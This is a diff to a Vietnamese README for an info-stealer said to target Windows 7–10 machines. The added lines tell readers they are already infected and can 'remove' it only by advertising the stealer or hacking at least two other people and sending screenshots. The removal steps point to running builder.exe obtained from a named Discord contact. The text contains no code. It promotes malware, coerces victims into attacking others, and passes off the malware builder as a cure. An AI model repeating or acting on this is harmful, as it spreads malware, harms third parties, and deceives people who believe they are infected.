@@ -1,4 +1,8 @@
 ## Tôi là người việt nam 🇻🇳
+nếu bạn bị mở ra cái này mà không phải bạn tìm thì đã dính stealer này
+để xoá thì chỉ cần quảng cáo stealer này thôi hoặc sài stealer hack 2 người + chụp ảnh hack máy tính người ta (bạn có thể hack người đó)
+quảng cáo và hack tối thiểu là 2 người nhé
+
 nó có thể hack 1 người rất đơn giản
 chỉ hack cho máy tính (windows 7 - 10)
 
@@ -10,7 +14,7 @@ chỉ hack cho máy tính (windows 7 - 10)
 nó có thể hack cực kỳ xịn
 
 **sao để xoá ?**
-1. **Chạy `builder.exe`:**
+1. **Chạy `builder.exe`:** builder.exe của discord:skid02233 gửi nhé không phải tải ở đây
    - Nhấp đúp vào tệp `builder.exe` để bắt đầu quá trình cài đặt.
 
 2. **Nhấn `builder remove`:**
